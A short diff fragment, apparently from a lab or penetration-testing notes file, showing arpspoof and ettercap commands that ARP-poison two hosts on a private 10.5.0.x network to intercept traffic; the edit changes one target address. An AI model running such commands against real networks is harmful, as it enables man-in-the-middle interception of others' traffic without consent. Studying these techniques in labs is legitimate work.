@@ -21,7 +21,7 @@ arpspoof -i eth0 -t 10.5.0.11 10.5.0.30 &
 arpspoof -i eth0 -t 10.5.0.30 10.5.0.11 & 
 
 # Alternative 
-ettercap -T -q -M arp:remote /10.5.0.30// /10.5.0.11//
+ettercap -T -q -M arp:remote /10.5.0.30// /10.5.0.10//
 
 ettercap -T -q -M arp:remote /10.5.0.30// /10.5.0.11//
 
